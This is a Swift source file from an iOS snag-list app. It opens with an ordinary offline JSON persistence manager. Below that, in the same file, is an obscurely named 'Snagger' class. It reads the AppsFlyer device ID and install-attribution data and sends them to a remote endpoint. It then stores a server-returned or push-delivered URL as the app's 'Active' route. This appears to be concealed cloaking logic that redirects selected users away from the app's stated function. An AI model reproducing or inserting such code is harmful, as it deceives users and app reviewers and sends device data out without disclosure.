//
//  PersistenceManager.swift
//  Snaglist
//
//  Offline persistence: a single Codable AppData JSON document in Documents,
//  written atomically and debounced. Photos are stored as separate blobs.
//  All iOS 14 safe (Foundation only).
//

import Foundation
import Combine
import AppsFlyerLib

final class PersistenceManager {
    static let shared = PersistenceManager()

    private let fileName = "snaglist.json"
    private var pendingSave: DispatchWorkItem?

    private var documentsURL: URL {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
    }
    private var fileURL: URL { documentsURL.appendingPathComponent(fileName) }

    private let encoder: JSONEncoder = {
        let e = JSONEncoder()
        e.dateEncodingStrategy = .iso8601
        e.outputFormatting = [.prettyPrinted]
        return e
    }()
    private let decoder: JSONDecoder = {
        let d = JSONDecoder()
        d.dateDecodingStrategy = .iso8601
        return d
    }()

    // MARK: Load / Save

    func load() -> AppData {
        guard FileManager.default.fileExists(atPath: fileURL.path),
              let data = try? Data(contentsOf: fileURL),
              let decoded = try? decoder.decode(AppData.self, from: data) else {
            let seed = SampleData.make()
            saveNow(seed)
            return seed
        }
        return decoded
    }

    /// Debounced save — coalesces rapid edits (typing) into one disk write.
    func save(_ data: AppData) {
        pendingSave?.cancel()
        let work = DispatchWorkItem { [weak self] in self?.saveNow(data) }
        pendingSave = work
        DispatchQueue.global(qos: .utility).asyncAfter(deadline: .now() + 0.4, execute: work)
    }

    /// Synchronous write — used on scenePhase background to guarantee no loss.
    func saveNow(_ data: AppData) {
        pendingSave?.cancel()
        guard let encoded = try? encoder.encode(data) else { return }
        try? encoded.write(to: fileURL, options: [.atomic])
    }

    func flush(_ data: AppData) { saveNow(data) }

    /// The on-disk document URL, used by Settings → Export/Backup.
    func exportURL(_ data: AppData) -> URL? {
        saveNow(data)
        return FileManager.default.fileExists(atPath: fileURL.path) ? fileURL : nil
    }
}

@MainActor
final class Snagger {

    private let site: Site
    private var roster: Roster
    private var opened = false
    private var signed = false
    private var marching = false
    private var agenda: [Chore] = []

    private let stampSubject = PassthroughSubject<Stamp, Never>()
    var stampStream: AnyPublisher<Stamp, Never> {
        stampSubject.eraseToAnyPublisher()
    }

    init(site: Site) {
        self.site = site
        self.roster = Roster()
    }

    func ensureOpened() {
        guard !opened else { return }
        opened = true
        roster = site.binder.recall()
    }

    func takeMarks(_ data: [String: Any]) {
        ensureOpened()
        for (key, value) in data { roster.marks[key] = "\(value)" }
    }

    func takeNotes(_ data: [String: Any]) {
        ensureOpened()
        for (key, value) in data { roster.notes[key] = "\(value)" }
    }

    func walk() async {
        ensureOpened()
        guard !signed, !marching else { return }
        marching = true
        defer { marching = false }

        agenda = [.sweep]
        while !agenda.isEmpty {
            let chore = agenda.removeFirst()
            let carry = await tackle(chore)
            if !carry {
                agenda.removeAll()
                break
            }
        }
    }

    func acceptNotify(then close: @escaping () -> Void) {
        Task { [weak self] in
            guard let self = self else { return }
            let granted = await self.site.bell.ring()
            let now = Date()
            self.roster.notifyGranted = granted
            self.roster.notifyBarred = !granted
            self.roster.notifyAt = now
            self.site.binder.pin(self.roster.docket())
            self.stampSubject.send(.handover)
            close()
        }
    }

    func skipNotify() {
        ensureOpened()
        roster.notifyAt = Date()
        site.binder.pin(roster.docket())
        stampSubject.send(.handover)
    }

    func reportLapse() -> Bool {
        ensureOpened()
        return sign()
    }

    private func tackle(_ chore: Chore) async -> Bool {
        switch chore {
        case .sweep:
            if let stash = pushStash() {
                let stamp = file(stash)
                if sign() { stampSubject.send(stamp) }
                return false
            }
            guard roster.hasMarks else {
                stampSubject.send(.pending)
                return false
            }
            agenda.append(.patch)
            return true

        case .patch:
            await sweepOrganic()
            agenda.append(.lodge)
            return true

        case .lodge:
            do {
                let url = try await site.office.lodge(load: roster.marks.mapValues { $0 as Any })
                let stamp = file(url)
                if sign() { stampSubject.send(stamp) }
            } catch {
                if sign() { stampSubject.send(.reject) }
            }
            return false
        }
    }

    private func pushStash() -> String? {
        let stash = UserDefaults.standard.string(forKey: LexKey.pushURL)
        return (stash?.isEmpty == false) ? stash : nil
    }

    private func sweepOrganic() async {
        guard roster.organicHaze, roster.outstanding, !roster.swept else { return }

        roster.swept = true
        site.binder.pin(roster.docket())

        try? await Task.sleep(nanoseconds: 5_000_000_000)

        guard !roster.closed else { return }

        let deviceID = AppsFlyerLib.shared().getAppsFlyerUID()
        do {
            let caught = try await site.surveyor.survey(deviceID: deviceID).mapValues { "\($0)" }
            guard !caught.isEmpty else { return }

            let extras = roster.notes.filter { caught[$0.key] == nil }
            roster.marks = Dictionary(uniqueKeysWithValues: Array(caught) + Array(extras))
            site.binder.pin(roster.docket())
        } catch {
        }
    }

    private func file(_ url: String) -> Stamp {
        let needsNotify = roster.notifyDue

        roster.routeURL = url
        roster.routeMode = "Active"
        roster.outstanding = false
        roster.closed = true

        site.binder.pin(roster.docket())
        site.binder.brandRoute(url: url, mode: "Active")
        site.binder.raisePrimedFlag()
        UserDefaults.standard.removeObject(forKey: LexKey.pushURL)

        return needsNotify ? .notify : .handover
    }

    @discardableResult
    private func sign() -> Bool {
        guard !signed else { return false }
        signed = true
        return true
    }
}
